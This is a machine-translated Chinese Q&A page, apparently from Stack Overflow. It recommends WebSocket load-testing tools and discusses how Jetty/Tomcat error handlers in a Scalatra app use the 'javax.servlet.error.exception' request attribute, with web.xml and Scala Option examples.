* * *

## 回答 #2

> 赞同：6
> 
> 时间：2015-08-07T17:27:43.943

几年过去了，还有另一个新工具可以对 Websockets 进行负载测试： [https ://github.com/observing/thor](https://github.com/observing/thor)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-01-23T10:44:13.390

为此目的使用Jmeter怎么样。虽然它还不直接支持 WebSocket，但您可以使用 TCP 采样器来完成工作。

或者，您可以获得一个插件，将 WebSocket 支持添加到 JMeter：http: [//github.com/maciejzaleski/JMeter](http://github.com/maciejzaleski/JMeter)

不用说 JMeter 和 WebSocket 插件都是开源的并且可以免费使用。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-08-20T13:06:28.047

您可以为此使用负载测试工具。

我在一个类似的项目中使用过[WebLOAD 。](http://www.radview.com)它记录使用浏览器时的网络流量——它记录常规的 HTTP 请求以及网络套接字流量——然后您可以与许多用户一起回放脚本并测量服务器的行为。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-10-21T19:50:47.393

[我对 tsung http://tsung.erlang-projects.org/](http://tsung.erlang-projects.org/)有很好的体验

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-08-26T11:20:01.177

我会用 Node.js 来做，这样你就可以使用你在实际客户端中使用的同一个 websocket 客户端库。

*   Node.js：[https ://nodejs.org/](https://nodejs.org/)
*   Websocket客户端例如socket.io-client：[http ://socket.io/get-started/chat/](http://socket.io/get-started/chat/)

# tomcat - Jetty/Tomcat 中处理异常的不同方式

> ID：12603999
> 
> 赞同：1
> 
> 时间：2012-09-26T14:28:25.747
> 
> 标签：tomcat, servlets, jetty, scalatra

问题的简短版本：什么会导致Scalatra /（Jetty或Tomcat）在不设置请求属性“javax.servlet.error.exception”的情况下将执行传递给ErrorHandler的*处理？*

更长的上下文：在我最近加入的一个项目中，ErrorHandlers 的句柄方法具有单独的块，用于处理来自“javax.servlet.error.exception”请求属性和所有其他异常的异常。我们在 Jetty 中运行我们的应用程序，据我了解，Jetty 解开 ServletExceptions 并将它们放在上面的属性中。什么会导致处理非“javax.servlet.error.exception”异常的块被调用呢？还是它是多余的并且可以删除？

最初编写代码的人离开了项目。技术堆栈的其余部分是 Scala 和 Scalatra，如果它有什么不同的话。

```
 Option(request.getAttribute("javax.servlet.error.exception"))
  .map { 
    exception => exception match {
         //various exceptions handled
   }.getOrElse(handleStatusCode(currentStatus)) 
```

**编辑**：似乎在某些环境中，代码在 Tomcat 上运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-05T16:20:02.860

我不知道完整的上下文，但我可以想象以下场景。

```
<servlet-mapping>
  <servlet-name>ErrorPageServlet</servlet-name>
  <url-pattern>/servlet/errorPage/*</url-pattern>
</servlet-mapping>

<error-page>
  <!--unauthorized-->
  <error-code>401</error-code>
  <location>/servlet/errorPage/401</location>
</error-page>

<error-page>
  <!--internal server error-->
  <error-code>500</error-code>
  <location>/servlet/errorPage/500</location>
</error-page> 
```

上面基本上说“对不同类型的 HTTP 错误使用相同的 ErrorPageServlet”。

然后在 servlet 中，您有一个条件来检查是否存在未捕获的异常（查看`"javax.servlet.error.exception"`请求属性），或者如果没有，则可能是某些原因导致了 HTTP 401。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T16:24:00.483

在这段代码中发生了几个方法调用，相当于如下：

```
val a = request.getAttribute("javax.servlet.error.exception")
val b = Option(a)
val c = b.map { exception => /* various exceptions handled... */ }
val d = c.getOrElse(handleStatusCode(currentStatus)) 
```

所以，`a`只是一个普通的 Java 调用。它将在请求中查找指定的属性，并将返回`Object`映射到该属性的 或`null`.

因为`b`我们调用`Option`构造函数将先前的结果包装在一个 Option 中（这比处理空值更具有 Scala 风格）。因此，如果`a`是`null`则将`b`是`None`，否则它将是`Some`包含的（非空）值的实例`a`。

在下一行，此选项被映射到一个新值。如果`b`是`None`（即`a`是`null`）那么`c`也将是`None`。否则，大括号内的逻辑将应用于 中包含的值`b`，并将此结果包装在 a 中返回`Some`。

最后，Option 被解包。如果`c`包含一些值，那么这个值本身就是整个块的结果。否则， is`c`是`None`，然后`handleStatusCode(currentStatus)`被评估，其结果是整个块的结果。

* * *

因此，我们可以说当且仅当is => was => was => 请求没有映射到的属性`handleStatusCode`时才会调用。`c``None``b``None``a``null``"javax.servlet.error.exception"`

这通常应该是这种情况（例如，在每个非错误请求上）。因此，只有当此块出现在检查中时，删除代码才是安全的，例如：

```
if (request.getAttribute("javax.servlet.error.exception") != null) {
   ...
   // your posted code
} 
```

即使你要删除它，你会用什么来代替它？`Option`当为空时应该是什么结果？由于这个原因，调用`get()`期权通常是一个坏主意。如果你*知道*它永远不会是空的，你就不需要按照`b`上面的行来包装它。